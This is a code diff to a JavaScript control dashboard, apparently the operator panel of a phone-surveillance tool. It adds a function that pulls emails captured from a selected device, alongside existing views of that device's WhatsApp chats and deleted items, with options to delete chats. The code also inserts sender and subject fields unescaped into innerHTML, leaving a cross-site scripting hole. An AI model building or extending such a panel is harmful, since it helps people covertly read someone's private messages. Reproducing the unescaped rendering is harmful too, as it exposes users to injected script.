@@ -196,6 +196,7 @@ async function loadAllData() {
     await loadDeviceInfo();
     await loadDeleted();
     await loadWhatsApp();
+    await loadEmails();
 }
 
 async function loadDeleted() {
@@ -208,6 +209,42 @@ async function loadDeleted() {
             allDeleted = deleted;
             displayDeleted();
         }
+    } catch (e) {}
+}
+
+// ✅ تحميل رسائل البريد الإلكتروني
+async function loadEmails() {
+    try {
+        const response = await fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
+        const emails = await response.json();
+        
+        const div = document.getElementById('emailsList');
+        if (!div) return;
+        
+        div.innerHTML = '';
+        
+        if (!emails || emails.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد رسائل بريد</p>';
+            return;
+        }
+        
+        emails.forEach(email => {
+            const item = document.createElement('div');
+            item.className = 'conversation-item';
+            item.innerHTML = `
+                <div class="conversation-avatar">📧</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${email.app_name || 'Email'} — ${email.sender || 'غير معروف'}</div>
+                    <div class="conversation-preview">${email.subject || ''}</div>
+                    <div class="conversation-time">📅 ${formatDate(email.timestamp)}</div>
+                </div>
+            `;
+            div.appendChild(item);
+        });
+        
+        const badge = document.getElementById('emailsCount');
+        if (badge) badge.textContent = `(${emails.length})`;
+        
     } catch (e) {}
 }
 
@@ -331,13 +368,11 @@ async function openWhatsAppChat(sender) {
     } catch (e) {}
 }
 
-// ✅ إغلاق المحادثة
 function closeWhatsAppChat() {
     const window = document.getElementById('whatsappChatWindow');
     if (window) window.remove();
 }
 
-// ✅ تحديد الكل
 function selectAllWhatsApp() {
     const msgs = document.querySelectorAll('.wa-msg');
     msgs.forEach(msg => {
@@ -351,7 +386,6 @@ function selectAllWhatsApp() {
     });
 }
 
-// ✅ حذف المحدد
 async function deleteSelectedWhatsApp() {
     const selected = document.querySelectorAll('.wa-msg.selected');
     if (selected.length === 0) {
@@ -377,7 +411,6 @@ async function deleteSelectedWhatsApp() {
     } catch (e) {}
 }
 
-// ✅ حذف دردشة كاملة
 async function deleteWhatsAppChat(sender) {
     if (!confirm(`حذف كل رسائل ${sender}؟`)) return;
     
@@ -391,7 +424,6 @@ async function deleteWhatsAppChat(sender) {
     } catch (e) {}
 }
 
-// ✅ تنسيق التاريخ
 function formatWhatsAppDate(t) {
     if (!t) return '—';
     try {
